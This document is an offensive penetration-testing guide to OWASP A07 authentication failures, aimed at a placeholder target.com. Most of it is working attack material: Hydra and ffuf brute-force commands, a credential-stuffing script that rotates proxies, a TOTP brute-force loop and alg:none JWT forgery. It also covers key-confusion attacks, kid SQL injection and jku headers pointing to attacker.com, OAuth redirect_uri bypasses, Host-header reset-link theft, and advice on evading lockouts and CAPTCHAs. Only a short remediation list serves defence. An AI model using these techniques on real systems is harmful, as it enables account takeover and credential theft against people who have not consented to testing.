# A07: Identification and Authentication Failures

## Overview

**Category:** A07:2021 – Identification and Authentication Failures  
**Previously:** A02:2017 – Broken Authentication  
**CVSS Range:** 7.0–9.8 (Critical for account takeover chains)  
**CWEs Covered:** CWE-287, CWE-295, CWE-297, CWE-303, CWE-306, CWE-307, CWE-346, CWE-384, CWE-521, CWE-613, CWE-620, CWE-640, CWE-798, CWE-940

### Why It Matters
Authentication failures are the #1 path to account takeover. This category covers every way to impersonate a legitimate user: guessing credentials, stealing sessions, bypassing MFA, and exploiting JWT weaknesses. A single exploited auth failure typically means full account access.

**Subtypes covered:**
- Brute force & credential stuffing
- Weak/default passwords
- Broken session management
- JWT attacks
- MFA bypass
- OAuth/OIDC flaws
- Password reset abuse

---

## Detection Methods

### Automated Scanning
```bash
# Hydra - brute force login
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  https-post-form "target.com/login:username=^USER^&password=^PASS^:Invalid credentials"

# Medusa
medusa -h target.com -u admin -P passwords.txt -M http \
  -m DIR:/login -m FORM:username=^USER^&password=^PASS^ \
  -m DENY:"Invalid"

# WFuzz - parameter fuzzing for auth bypass
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
  -d "user=admin&pass=FUZZ" \
  --hh 1523 \  # Hide responses with 1523 bytes (failed login page)
  https://target.com/login

# Nuclei - auth-specific templates
nuclei -u https://target.com -t exposures/configs/ -t default-logins/
```

### Manual Testing
```bash
# 1. Test account lockout policy
for i in {1..20}; do
  curl -s -X POST https://target.com/login \
    -d "user=valid@target.com&pass=wrong$i" \
    -w "%{http_code}\n" -o /dev/null
done
# If all 401 (no lockout) = vulnerable to brute force

# 2. Test password complexity
curl -X POST https://target.com/register \
  -d "user=test@test.com&pass=1"  # 1 char password - should fail
curl -X POST https://target.com/api/change-password \
  -d "new_pass=password"  # Common password - should fail

# 3. Test session fixation
curl -c cookies.txt https://target.com/login
# Get session ID from cookies.txt, then authenticate
# Check: does session ID change after login?
```

---

## What to Look For

### Brute Force Indicators
- No CAPTCHA after failed attempts
- No account lockout (test 20+ failures)
- No rate limiting on auth endpoints
- Username enumeration (different errors for valid vs invalid users)
- `Login failed: incorrect password` vs `User not found` (different responses = enumeration)

### Session Management Weaknesses
```bash
# Session ID in URL (never acceptable)
https://target.com/dashboard?sessionid=abc123

# Predictable session tokens
# Session 1: abc100001
# Session 2: abc100002
# Session 3: abc100003  ← sequential = predictable

# Short session tokens (< 128 bits entropy)
# Check cookie length and character set

# Missing Secure/HttpOnly flags
curl -I https://target.com/login | grep -i "set-cookie"
# Bad:  Set-Cookie: session=abc123; path=/
# Good: Set-Cookie: session=abc123; path=/; Secure; HttpOnly; SameSite=Strict

# Long-lived sessions / no expiry
# Check cookie Max-Age or Expires
```

### JWT Vulnerabilities
```bash
# Decode JWT header/payload (no signature verification)
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.xxx" | \
  cut -d. -f1,2 | tr '.' '\n' | base64 -d 2>/dev/null

# Check algorithm field
# {"alg":"HS256"} - normal
# {"alg":"none"}  - catastrophic if accepted
# {"alg":"RS256"} - check for RS256→HS256 confusion attack
```

---

## Testing Methodology

### Phase 1: Username Enumeration
```bash
# Compare response sizes/times for valid vs invalid usernames
# Valid user
time curl -s -X POST https://target.com/login \
  -d "user=admin@target.com&pass=wrong" -o /dev/null

# Invalid user  
time curl -s -X POST https://target.com/login \
  -d "user=nonexistent@target.com&pass=wrong" -o /dev/null

# Password reset enumeration
curl -s -X POST https://target.com/forgot-password \
  -d "email=admin@target.com"  # "Email sent" = valid user
curl -s -X POST https://target.com/forgot-password \
  -d "email=fake@fake.com"  # Different message = enumerable
```

### Phase 2: Brute Force / Credential Stuffing
```bash
# Credential stuffing with known breach data
# Get lists: HaveIBeenPwned, breach compilations
# Tool: Sentry MBA, Snipr, or custom script

# Targeted brute force with username list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -o found.txt \
  -f \  # Stop after first success
  -t 4 \  # 4 threads
  https-post-form "target.com/login:email=^USER^&password=^PASS^:incorrect"

# API endpoint brute force (often less protected than web UI)
ffuf -u https://target.com/api/v1/auth/login \
  -w /usr/share/wordlists/rockyou.txt:FUZZ \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"FUZZ"}' \
  -fr '"error"'
```

### Phase 3: JWT Attacks
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool
pip3 install -r requirements.txt

# Full JWT audit
python3 jwt_tool.py <TOKEN> -t https://target.com/api/admin \
  -rh "Authorization: Bearer <TOKEN>"

# Test "none" algorithm attack
python3 jwt_tool.py <TOKEN> -X a  # alg:none attack

# Test RS256 → HS256 confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem  # Key confusion

# Brute force JWT secret
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Crack with hashcat
hashcat -a 0 -m 16500 <JWT_TOKEN> rockyou.txt
```

### Phase 4: MFA Bypass
```bash
# 1. Direct endpoint access (skip MFA step entirely)
# Login normally → intercepted after password, before MFA
# Try accessing /dashboard directly with session cookie

# 2. Response manipulation
# Intercept MFA verification response:
# {"success": false, "mfa_required": true}
# Change to: {"success": true, "mfa_required": false}

# 3. Brute force 6-digit TOTP (if no rate limit)
for code in $(seq -w 0 999999); do
  result=$(curl -s -X POST https://target.com/api/mfa/verify \
    -d "code=$code&session=SESS_TOKEN")
  if echo "$result" | grep -q "success"; then
    echo "Found: $code"
    break
  fi
done

# 4. SIM swap / SS7 attack on SMS MFA (conceptual)
# For reporting: SMS-based MFA is inherently weaker than TOTP/FIDO2
```

### Phase 5: Session Attacks
```bash
# Session fixation test
# 1. Get unauthenticated session ID
PRESESSION=$(curl -sc cookies.txt https://target.com/ -o /dev/null && \
  grep "session" cookies.txt | awk '{print $7}')
echo "Pre-auth session: $PRESESSION"

# 2. Authenticate
curl -b "session=$PRESESSION" -X POST https://target.com/login \
  -d "user=victim@target.com&pass=correctpassword" -c cookies2.txt

# 3. Check post-auth session ID
POSTSESSION=$(grep "session" cookies2.txt | awk '{print $7}')
echo "Post-auth session: $POSTSESSION"

# If PRESESSION == POSTSESSION → SESSION FIXATION VULNERABLE
# Attacker flow: set victim's session to known value, wait for login, hijack
```

### Phase 6: Password Reset Abuse
```bash
# 1. Password reset token brute force
# Request reset token, check token entropy
curl -s -X POST https://target.com/forgot-password \
  -d "email=victim@target.com"

# Token patterns to watch:
# ?token=1234 (sequential integer - predictable)
# ?token=abc123 (6 chars - only 2.17B combinations, feasible)
# ?token=<email_base64> (derivable from email)

# 2. Host header injection in reset emails
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
# If reset link in email uses Host header → points to attacker.com

# 3. Password reset token reuse
# Use same token twice → if accepted = tokens not invalidated
```

---

## Exploitation Techniques

### Credential Stuffing Attack Chain
```bash
# Step 1: Obtain breach data
# SecLists has common credential lists
# /usr/share/seclists/Passwords/

# Step 2: Test validity with rate-limit evasion
cat > stuffing.py << 'EOF'
import requests, time, random

credentials = [("user1@email.com","pass1"), ("user2@email.com","pass2")]
proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]  # Rotate IPs

for email, password in credentials:
    proxy = {"http": random.choice(proxies_list), "https": random.choice(proxies_list)}
    r = requests.post("https://target.com/login",
                      data={"email": email, "password": password},
                      proxies=proxy, allow_redirects=False)
    if r.status_code == 302:  # Redirect on success
        print(f"[+] VALID: {email}:{password}")
    time.sleep(random.uniform(2, 8))  # Random delay
EOF
python3 stuffing.py
```

### JWT None Algorithm Attack
```bash
# Original JWT: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciJ9.SIGNATURE

# Craft "none" JWT manually
# Header: {"alg":"none"}
HEADER=$(echo -n '{"alg":"none"}' | base64 | tr -d '=' | tr '+/' '-_')
# Payload: {"user":"admin","role":"admin"} - MODIFIED
PAYLOAD=$(echo -n '{"user":"admin","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_')
# No signature
EVIL_JWT="$HEADER.$PAYLOAD."

curl https://target.com/api/admin \
  -H "Authorization: Bearer $EVIL_JWT"
```

### JWT RS256 → HS256 Key Confusion
```bash
# Background: If server uses RS256 but also accepts HS256,
# attacker can sign HS256 JWT with the PUBLIC key (obtainable)

# 1. Get public key
curl https://target.com/.well-known/jwks.json
# or: openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# 2. Create HS256 JWT signed with public key
python3 jwt_tool.py <ORIGINAL_JWT> -X k -pk server_public.pem

# 3. Send modified token
curl https://target.com/api/admin \
  -H "Authorization: Bearer <FORGED_JWT>"
```

### OAuth Authorization Code Theft
```bash
# 1. Find OAuth redirect_uri parameter
# 2. Test for open redirect at redirect_uri endpoint
# 3. Chain: OAuth → open redirect → steal auth code

# Test redirect_uri bypass
curl "https://target.com/oauth/authorize?
  client_id=app&
  redirect_uri=https://attacker.com/callback&
  response_type=code&
  scope=read"

# Common bypasses:
# redirect_uri=https://target.com.attacker.com  (subdomain confusion)
# redirect_uri=https://target.com/callback%2F..%2F..%2Fattacker.com
# redirect_uri=https://target.com/callback#@attacker.com
```

---

## Verification

### Confirm Brute Force Success
```bash
# After finding valid creds, authenticate and verify access
curl -c session.txt -X POST https://target.com/login \
  -d "email=admin@target.com&password=FOUND_PASSWORD" -L

# Check for admin indicators in response
curl -b session.txt https://target.com/api/profile
# Look for: {"role":"admin"}, admin dashboard access, etc.
```

### Confirm JWT Forgery
```bash
# Check if forged JWT returns privileged response
curl https://target.com/api/admin \
  -H "Authorization: Bearer FORGED_JWT" \
  -v 2>&1 | grep -E "HTTP/|{|}"
# 200 with admin data = success
# 401/403 = failed
```

### Confirm Session Fixation
```bash
# Pre-auth session ID was abc123
# After victim logs in with that session
curl https://target.com/api/profile \
  -H "Cookie: session=abc123"
# Returns victim's profile = session fixation successful
```

---

## Common Problems & Solutions

| Problem | Cause | Solution |
|---------|-------|----------|
| Brute force blocked after 5 attempts | Account lockout | Slow spray: 1 attempt per account per 30 min; use distributed IPs |
| CAPTCHA blocking automation | Anti-bot protection | 2captcha/anti-captcha API for solving; or look for mobile API without CAPTCHA |
| JWT attack fails | Strong secret or correct alg validation | Try other attacks: kid injection, jku/x5u header injection |
| MFA code expired before test | 30-second TOTP window | Pre-stage automation, sync NTP time; or target SMS MFA |
| Password reset token valid only once | Token invalidated on use | Intercept email, use immediately; test for parallel requests |
| Session ID rotates on login | Properly implemented session management | Move to JWT/cookie theft approaches instead |
| HTTPS only - can't MITM session | TLS enforced | Focus on XSS for cookie theft, or subdomain takeover |

---

## Tools

### Brute Force & Credential Stuffing
```bash
# Hydra - versatile password attack tool
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -o results.txt -t 16 -f \
  https-post-form "target.com/login:email=^USER^&password=^PASS^:error"

# Burp Intruder / Turbo Intruder (for rate-limit evasion)
# Use cluster bomb attack for user:pass pairs
# turbo_intruder.py for high-speed fuzzing

# Credmaster - OAuth/SSO credential stuffing
python3 credmaster.py --attack o365 \
  --userfile users.txt --passwordfile passwords.txt

# Spray - password spraying (avoids lockout)
spray.sh -smb 10.0.0.0/24 users.txt passwords.txt 3 35 DOMAIN
```

### JWT Tools
```bash
# jwt_tool - Swiss army knife for JWT attacks
python3 jwt_tool.py TOKEN -t TARGET_URL -rh "Authorization: Bearer TOKEN"

# jwt_cracker - brute force JWT secrets  
node jwt-cracker/index.js TOKEN rockyou.txt

# Hashcat - GPU accelerated JWT cracking
hashcat -a 0 -m 16500 TOKEN.txt rockyou.txt --show
```

### Session Analysis
```bash
# Cookie editor browser extension - manual session testing
# Wireshark - capture session tokens on HTTP
# Burp Suite - session token analysis (Sequencer tool)
burpsuite → Proxy → Intercept → Send to Sequencer
# Analyze randomness quality of session tokens
```

---

## Bypass Techniques

### Rate Limit Bypass
```bash
# Header rotation (if rate limit is per-IP via header)
X-Forwarded-For: 1.2.3.4  # Rotate this value per request
X-Real-IP: 1.2.3.4
True-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4

# Null byte in username (may bypass some filters)
admin%00@target.com

# Unicode normalization bypass
аdmin@target.com  # 'а' is Cyrillic, normalized to 'a' by some systems

# Case variation
ADMIN@target.com, Admin@Target.com
```

### MFA Bypass Techniques
```bash
# 1. Try accessing post-MFA pages directly with only-password-verified session

# 2. Response tampering (Burp Suite)
# Intercept MFA POST response
# Change: {"verified": false} → {"verified": true}
# Change: HTTP 403 → HTTP 200

# 3. Backup code brute force
# Backup codes are often 8 numeric digits = 10^8 = 100M combinations
# But many systems don't rate-limit backup codes

# 4. TOTP code reuse (window extension)
# Some systems accept codes from ±2 time windows (120 second window)
# Test: use same TOTP code twice in quick succession

# 5. SIM swap scenario
# Target: SMS-based MFA only
# Social engineer carrier to port number
# Receive MFA codes
```

### JWT Bypass Techniques
```bash
# kid (Key ID) SQL injection
# If kid parameter is used in SQL query to fetch key:
{"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' -- -"}
# Sign JWT with 'attacker_secret'

# jku/x5u header injection  
# Point to attacker-controlled JWKS endpoint
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}
# Host your own JWKS with your public key

# Embedded JWK attack
# Include your own public key in the JWT header
{"alg":"RS256","jwk":{"kty":"RSA","n":"...attacker_pubkey...","e":"AQAB"}}
```

---

## Remediation (For Reporting)

```
✓ Implement account lockout after 5-10 failures (with exponential backoff)
✓ Rate limit auth endpoints (10 req/min per IP)
✓ Enforce strong passwords (min 12 chars, breach database check)
✓ Use cryptographically secure session IDs (128+ bits entropy)
✓ Rotate session ID on authentication (prevent fixation)
✓ Set Secure; HttpOnly; SameSite=Strict on session cookies
✓ Session expiry: active (30 min inactivity) + absolute (8 hours)
✓ Validate JWT algorithm server-side (never trust alg from token)
✓ Use strong JWT secrets (256+ bits) or RSA keys (2048+)
✓ Prefer FIDO2/WebAuthn > TOTP > SMS for MFA
✓ Never expose different error messages for valid vs invalid usernames
✓ Implement CAPTCHA or behavioral analysis for auth endpoints
✓ Log all auth events with IP, timestamp, user agent
```

---

## Real-World CVEs

| CVE | System | Attack | Impact |
|-----|--------|--------|--------|
| CVE-2022-22965 (Spring4Shell) | Spring Framework | Auth bypass + RCE chain | Critical |
| CVE-2021-3156 | Sudo | Auth bypass → root | Full system compromise |
| CVE-2020-1472 (Zerologon) | Windows Netlogon | Auth bypass | Domain admin in seconds |
| CVE-2019-19781 | Citrix ADC | Auth bypass + path traversal | RCE pre-auth |
| CVE-2018-13379 | Fortinet VPN | No auth required for credential files | 500K+ VPNs exposed |

### Colonial Pipeline 2021
- Vector: Compromised VPN credentials from dark web
- No MFA on VPN
- Single set of creds = full network access
- Impact: US fuel supply disruption, $4.4M ransom paid
